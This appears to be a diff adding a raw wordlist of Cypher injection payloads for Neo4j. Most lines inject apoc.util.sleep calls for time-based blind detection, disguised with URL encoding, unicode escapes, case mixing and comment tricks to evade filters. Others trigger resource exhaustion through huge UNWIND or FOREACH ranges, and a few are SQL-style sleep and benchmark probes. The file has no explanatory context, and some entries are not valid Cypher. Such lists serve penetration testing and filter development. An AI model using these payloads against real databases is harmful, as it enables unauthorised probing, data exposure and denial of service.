@@ -1,0 +1,50 @@
+' CALL apoc.util.sleep(5000) --
+' UNION CALL apoc.util.sleep(5000) --
+' aNd CaLl ApOc.UtIl.SlEeP(5000) --
+%27%20CALL%20apoc.util.sleep(5000)%20--
+%2527%20CALL%20apoc.util.sleep(5000)%20--
+\u0027 CALL apoc.util.sleep(5000) --
+'/comment/CALL/comment/apoc.util.sleep(5000) --
+' CALL/* */apoc.util.sleep(5000) --
+' CALL//apoc.util.sleep(5000)// --
+' CALL apoc.util.sleep(5000)--
+' CALL apoc.util.sleep(5000)#
+' OR CALL apoc.util.sleep(5000) --
+' MATCH (n) WHERE 1=1 CALL apoc.util.sleep(5000) RETURN n --
+' WITH 1 AS x CALL apoc.util.sleep(5000) RETURN x --
+' UNWIND range(1,1000000) AS i RETURN i --
+' MATCH (n) UNWIND range(1,100000) AS i RETURN n --
+' CALL apoc.util.sleep(10000) --
+\u0027\u0020CALL\u0020apoc.util.sleep(5000)\u0020--
+' CALL apoc.util.sleep(5000) /comment/ --
+' CALL apoc.util.sleep(5000) //
+%27+CALL+apoc.util.sleep(5000)+--
+' CALL apoc.util . sleep(5000) --
+' CALL apoc.util.sleep/* */(5000) --
+' MATCH (n) CALL apoc.util.sleep(5000) RETURN n --
+' OPTIONAL MATCH (n) CALL apoc.util.sleep(5000) RETURN n --
+' WHERE id(n) = 1 CALL apoc.util.sleep(5000) --
+' RETURN apoc.util.sleep(5000) --
+' CALL apoc.util.sleep(concat(5000)) --
+' CALL apoc.util.sleep(5*1000) --
+%2527%20OR%20CALL%20apoc.util.sleep(5000)%20--
+' OR (CALL apoc.util.sleep(5000)) --
+' AND CALL apoc.util.sleep(5000) --
+'; CALL apoc.util.sleep(5000); --
+' UNION ALL CALL apoc.util.sleep(5000) --
+' WITH apoc.util.sleep(5000) AS delay RETURN delay --
+' CALL apoc.util.sleep(5000) YIELD value RETURN value --
+' FOREACH (i IN range(1,1000000) | SET n.prop = i ) --
+' UNWIND [1..1000000] AS i RETURN i --
+' MATCH (n) FOREACH (i IN range(1,100000) | SET n.i = i) RETURN n --
+' CALL dbms.listQueries() YIELD queryId WITH collect(queryId) AS ids UNWIND ids AS id CALL apoc.util.sleep(5000) YIELD value RETURN value --
+' CALL apoc.util.sleep(5000) OR 1=1 --
+' CALL apoc.util.sleep(5000) AND true --
+' IF (1=1) CALL apoc.util.sleep(5000) --
+' CALL apoc.util.sleep(5000); RETURN 1 --
+%7B' CALL apoc.util.sleep(5000) %7D
+' SLEEP(5) --
+' (SELECT COUNT(*) FROM large_graph CROSS JOIN large_graph) --
+' UNWIND range(1,5000000) AS i UNWIND range(1,2) AS j RETURN i,j --
+' MATCH (n)-[r]->(m) CALL apoc.util.sleep(5000) RETURN n --
+' BENCHMARK(1000000,MD5(1)) --
